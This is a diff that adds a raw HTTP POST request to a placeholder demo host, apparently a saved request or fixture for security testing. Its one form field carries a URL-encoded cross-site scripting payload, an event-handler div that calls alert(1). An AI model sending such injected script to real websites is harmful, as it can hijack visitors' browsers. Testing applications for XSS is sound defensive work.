@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+Connection: close
+
+file=%3Cdiv+onmouseenter%3Dalert%281%29%3Ehover%3C%2Fdiv%3E
